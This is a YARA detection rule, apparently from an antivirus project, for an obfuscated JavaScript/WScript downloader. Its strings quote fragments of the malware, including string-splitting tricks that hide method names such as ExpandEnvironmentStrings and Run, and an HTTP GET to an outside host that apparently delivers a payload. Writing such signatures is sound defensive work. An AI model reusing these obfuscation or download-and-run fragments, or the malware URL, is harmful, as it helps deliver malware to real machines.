rule sig_20160428_7ba2d4c93070844d88911a4244147c7c {
  meta:
    description = "datamaliciousorder - file 20160428_7ba2d4c93070844d88911a4244147c7c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "001cc881c830dfdc625c9ab4d2ddfec32e720803c58854ea92f4f05e115e84e7"

  strings:
    $s1  = "function QgbPulRknHkrMnrGrrOhi() {return GvrUctAwsOeyIrzVfzWgk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function WtkAoyGrjDalQijTbyYzs(AtmEgjXkdIlzAewFcsMno){GvrUctAwsOeyIrzVfzWgk[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function WtkAoyGrjDalQijTbyYzs(AtmEgjXkdIlzAewFcsMno){GvrUctAwsOeyIrzVfzWgk[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function EzmCqcCpsWugStoOyyWaj(DiyKzuKzjWifOibWjwGhp, GhhKhsEwgGqzVpyUlmGou){TxhSvfTtwNcfFgdPplBfc = TxhSvfTtwNcfFgdPplBfc * 1; " ascii
    $s5  = "return DiyKzuKzjWifOibWjwGhp - GhhKhsEwgGqzVpyUlmGou;};" fullword ascii
    $s6  = "var GvrUctAwsOeyIrzVfzWgk = function HjqHbkPshZjxSarVceIng() {return AisUvdNawWttDjxZvwLjv[GwhZxnLyqCunKjfCvmZbu](\"WScript\"+\"" ascii
    $s7  = "GdxRzkDdeEakEzbZzqNtc[ObhCumCytEwzQubXfoRgv](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s8  = "var GvrUctAwsOeyIrzVfzWgk = function HjqHbkPshZjxSarVceIng() {return AisUvdNawWttDjxZvwLjv[GwhZxnLyqCunKjfCvmZbu](\"WScript\"+\"" ascii
    $s9  = "var AisUvdNawWttDjxZvwLjv = this[\"WScript\"];" fullword ascii
    $s10 = "function QgbPulRknHkrMnrGrrOhi() {return GvrUctAwsOeyIrzVfzWgk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (GdxRzkDdeEakEzbZzqNtc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function EzmCqcCpsWugStoOyyWaj(DiyKzuKzjWifOibWjwGhp, GhhKhsEwgGqzVpyUlmGou){TxhSvfTtwNcfFgdPplBfc = TxhSvfTtwNcfFgdPplBfc * 1; " ascii
    $s13 = "function OerXhkDsxVmxEthMiiAja(){return NhzNweHvtBpjBoiVnlWth + \"\";};" fullword ascii
    $s14 = "function MtvAroQrcSuiJopWipUya() {return ((KpcWfyZyfLldJawZmsWwk == true) && (KpcWfyZyfLldJawZmsWwk == PhrKraRomDkaOfaMarLtp)) ?" ascii
    $s15 = "function MtvAroQrcSuiJopWipUya() {return ((KpcWfyZyfLldJawZmsWwk == true) && (KpcWfyZyfLldJawZmsWwk == PhrKraRomDkaOfaMarLtp)) ?" ascii
    $s16 = "function FxhQmjDxmTtsTeoDjcLwc()" fullword ascii
    $s17 = "function IqnGzpGomJkrNhkNwcJqc(){return 23;};" fullword ascii
    $s18 = "PhrKraRomDkaOfaMarLtp = true; " fullword ascii
    $s19 = "VboYwgLdfBejZztPtrMsw = true;" fullword ascii
    $s20 = "var VboYwgLdfBejZztPtrMsw = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}